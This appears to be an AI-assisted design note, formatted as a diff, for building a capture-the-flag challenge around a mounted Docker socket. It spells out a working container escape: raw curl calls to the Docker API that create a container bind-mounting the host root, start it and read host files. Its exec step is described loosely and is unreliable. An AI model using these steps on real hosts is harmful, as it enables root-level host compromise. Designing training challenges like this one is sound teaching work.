@@ -1,0 +1,220 @@
+1. Recon via Docker API
+
+They enumerate:
+
+running containers
+images
+permissions
+
+Endpoints like:
+
+/containers/json
+/info
+/version
+
+Goal: understand they’re talking to a full Docker daemon.
+
+2. Container creation abuse
+
+This is the key design idea you’re building toward:
+
+Players realize they can ask Docker to:
+
+“Start a new container with arbitrary configuration”
+
+And Docker will obey.
+
+The dangerous capability you enabled via socket mount is:
+
+creating containers
+specifying bind mounts
+choosing images
+running commands
+3. Host filesystem exposure (core CTF win condition)
+
+The critical misconfiguration you intentionally built into the challenge is:
+
+Docker daemon is running on the host, and the container can control it
+
+So players create a new container that:
+
+mounts the host filesystem (/)
+or a sensitive directory like /opt/ctf
+and then reads the flag
+💡 What your challenge design becomes
+
+Instead of “exploit API directly”, your CTF becomes:
+
+Step A — Discover socket
+
+/var/run/docker.sock
+
+Step B — Confirm API access
+
+/_ping, /version
+
+Step C — Enumerate Docker environment
+
+see containers, images
+
+Step D — Abuse container creation
+
+spawn helper container
+
+Step E — Escape by mount
+
+read:
+
+flag{docker_socket_is_root}
+🧩 Important design decision (this is where good CTFs differ)
+
+You now choose difficulty:
+
+Easy mode (not recommended for your case)
+Give Docker CLI inside container
+Players run:
+docker run -v /:/host alpine cat /host/opt/ctf/flag.txt
+
+👉 too easy, no learning
+
+🟡 Medium mode (what you’re building)
+No docker CLI
+Only socket access
+Players must use raw HTTP API
+
+They must figure out:
+
+JSON payloads
+container lifecycle
+mount syntax
+
+👉 this is good CTF design
+
+🔴 Hard mode (best version)
+
+You hide key requirements:
+
+no obvious /containers/create hint in logs
+fake endpoints or noise in API responses
+maybe require multi-step enumeration before creation works
+How to validate your challenge is correct
+
+From inside container, a player should be able to:
+
+1. Confirm API works
+curl --unix-socket /var/run/docker.sock http://localhost/_ping
+2. See Docker is real
+curl --unix-socket /var/run/docker.sock http://localhost/version
+3. Observe system
+curl --unix-socket /var/run/docker.sock http://localhost/containers/json
+
+If all 3 work → your challenge is valid.
+
+
+----------------------------------------------------
+STEP 1 — Recon endpoints (you already did this)
+Check API is alive
+curl --unix-socket /var/run/docker.sock http://localhost/_ping
+
+Expected:
+
+OK
+Get version info
+curl --unix-socket /var/run/docker.sock http://localhost/version
+
+Players extract:
+
+ApiVersion
+Engine version
+confirms real Docker
+List containers
+curl --unix-socket /var/run/docker.sock http://localhost/containers/json
+
+If empty → still fine (actually better for realism)
+
+🔥 STEP 2 — Create container (core exploit)
+
+This is the key moment.
+
+Endpoint:
+POST /containers/create
+Payload (IMPORTANT PART OF YOUR CHALLENGE)
+
+Players send:
+
+curl -X POST \
+--unix-socket /var/run/docker.sock \
+-H "Content-Type: application/json" \
+-d '{
+  "Image": "alpine",
+  "Cmd": ["sleep", "9999"],
+  "HostConfig": {
+    "Binds": ["/:/host"]
+  }
+}' \
+http://localhost/containers/create?name=escape
+What this does
+Creates a new container
+Mounts host filesystem into /host
+Keeps container alive
+
+👉 This is your “escape primitive”
+
+▶️ STEP 3 — Start container
+
+Docker returns an ID:
+
+{"Id":"abc123..."}
+
+Then:
+
+curl -X POST \
+--unix-socket /var/run/docker.sock \
+http://localhost/containers/escape/start
+💣 STEP 4 — Read the flag
+
+Now inside the created container (conceptually):
+
+Players execute:
+
+curl --unix-socket /var/run/docker.sock \
+http://localhost/containers/escape/exec
+
+BUT for simplicity in CTF design, you usually allow a shortcut:
+
+👉 OR just rely on host mount directly in container context
+
+So inside container (if exec or shell is allowed):
+
+cat /host/opt/ctf/flag.txt
+🧩 Cleaner CTF DESIGN (recommended improvement)
+
+Instead of making players deal with Docker exec API (which is annoying), simplify:
+
+In container creation:
+
+Make command override easier:
+
+"Cmd": ["cat", "/host/opt/ctf/flag.txt"]
+
+BUT that makes it a one-shot exploit, which is too easy.
+
+⭐ Best balanced version (what I recommend)
+
+Use 2-step execution:
+
+Step A (create container)
+mounts /
+Step B (start container)
+Step C (exec into container)
+
+Then inside:
+
+ls /host
+cat /host/opt/ctf/flag.txt
+
+This gives:
+
+realism
+interaction
+not instant win
